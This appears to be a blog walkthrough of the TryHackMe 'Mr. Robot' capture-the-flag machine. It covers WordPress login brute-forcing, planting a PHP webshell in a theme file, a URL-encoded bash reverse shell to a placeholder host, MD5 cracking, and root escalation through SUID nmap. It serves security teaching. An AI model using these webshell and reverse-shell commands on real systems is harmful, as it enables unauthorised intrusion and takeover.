# Mr. Robot CTF Walkthrough | THM

- **Source URL:** https://medium.com/@ker0los/mr-robot-ctf-walkthrough-thm-13af8879b08a
- **Fetched from:** https://medium.com/@ker0los/mr-robot-ctf-walkthrough-thm-13af8879b08a?source=rss-92a6e4074380------2
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/14920 (id 14920)
- **Method:** medium-rss-feed (full content:encoded) readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
- **Author/Published (RSS):** Kerolos Iskander (ker0los) / Tue, 22 Sep 2026 04:33:08 GMT

*Written by Kerolos Iskander | Jr. Penetration Tester*

“Mr. Robot” is a well-known boot2root machine inspired by the TV show of the same name. The goal is simple on paper: find three hidden keys scattered across the system. In practice, it’s a great exercise in web enumeration, WordPress exploitation, password cracking, and classic Linux privilege escalation.

This writeup doesn’t just show *what* commands were run — it explains *why* each step works, so you can apply the same thinking to other machines.

**Content covered:**

Every engagement starts with reconnaissance. One of the most overlooked but valuable files on a web server is robots.txt. It's meant to tell search engine crawlers which pages *not* to index — but developers often accidentally leave sensitive filenames in it.

http://machine\_ip/robots.txt

Result:

Two interesting files are exposed directly:

**Lesson:** always check robots.txt early. It's a zero-cost step that occasionally hands you credentials, hidden paths, or (as here) an entire flag.

Download the wordlist for later use:

curl -O http://machine\_ip/fsocity.dic

And don’t forget to clean it and delete duplicates.

With a custom wordlist in hand, the natural next step is to find a login form. Mr. Robot runs WordPress, so /wp-login is the target.

Using the fsocity.dic wordlist against the login form (with a tool like, hydra, or Burp Intruder) eventually reveals valid credentials:

Username: elliot

Password: ER28-0652

**Why this works:** the wordlist wasn’t a generic list like rockyou.txt it was a machine specific list, hinting that the password was intentionally "hideable" only to someone who found and used this exact file. This is a common CTF pattern: a hint file points you toward the exact tool you need for the next step.

Logging in as elliot grants access to the **WordPress Dashboard** as an administrator. This is a critical trust boundary, WordPress admins are allowed to edit theme files directly through **Appearance → Editor**.

The Theme Editor lets an admin edit .php files that belong to the active theme, and saves them *directly to disk on the server*. Since WordPress themes are just PHP files executed by the web server, editing one is functionally identical to uploading a webshell — except WordPress does it for you, with no file upload restrictions to bypass.

We picked 404.php (an error page — safe to modify without breaking the live site) and added:

system($\_GET\['cmd'\]);

Once saved correctly, visiting:

http://machine\_ip/wp-content/themes/twentyfifteen/404.php?cmd=ls

executes arbitrary shell commands as the web server user.

The next step is a **reverse shell**: a connection initiated *from* the target back *to* our machine, giving us a full interactive terminal.

nc -lvnp 4444

This tells our machine to listen for an incoming TCP connection on port 4444.

bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/YOUR\_IP/4444%200%3E%261%27

This spawns an interactive bash shell and redirects its input/output/error streams over a TCP socket to our listener.

— —

Once the payload hits, the listener catches a shell running as the web server’s user (often www-data or, on this box, daemon).

With shell access, basic enumeration of /home reveals other users on the system:

cd /home

ls -la

robot

ubuntu

Inside robot's home directory:

key-2-of-3.txt    -> readable only by robot

password.raw-md5 -> readable by everyone

We can’t read the flag directly (permission denied), but we *can* read the password hash file. This is a deliberate design: the box wants you to crack your way into the robot account.

cat password.raw-md5

Then crack it with [https://crackstation.net](https://crackstation.net/)

Once cracked, switch users

su robot enter the password

Now we can read the second flag:

cat key-2-of-3.txt

**Lesson:** raw, unsalted MD5 is essentially a lookup problem, not an encryption problem. If a hash is crackable with a common wordlist, the password was never really protected in the first place — this is exactly why modern systems use salted, slow hashing algorithms like bcrypt or Argon2.

The final and most classic step. As robot, we check for **SUID binaries** executables that run with the *file owner's* privileges rather than the *invoking user's* privileges. If a SUID binary is owned by root and has a way to spawn a shell or execute arbitrary commands, it's an instant privilege escalation path.

find / -perm -u=s -type f 2>/dev/null

Among the standard system binaries, one stands out:

/usr/local/bin/nmap

nmap is **not** normally installed with the SUID bit set this is a strong signal it was intentionally configured this way for the challenge.

Versions of nmap older than 5.21 shipped with an **interactive mode**, intended for scripting scans. That interactive mode included an ! escape command that runs a shell command using the *current process's* privileges:

nmap --interactive

nmap> !sh

Because the nmap binary itself was launched with the SUID bit and owned by root, the shell spawned via !sh inherits root's effective privileges — not robot .

**Lesson:** the SUID bit should only ever be set on binaries that are specifically designed and audited to be safe when run by unprivileged users. nmap's interactive mode was never meant to be exposed this way — this vulnerability was patched by removing interactive mode entirely in later versions. Always check find / -perm -u=s on a fresh foothold; it's one of the highest-value, lowest-effort privilege escalation checks you can run.And we are done; the challenge has been successfully solved.

**LinkedIn:** [https://www.linkedin.com/in/kerolos-iskander-4a277033a](https://www.linkedin.com/in/kerolos-iskander-4a277033a)
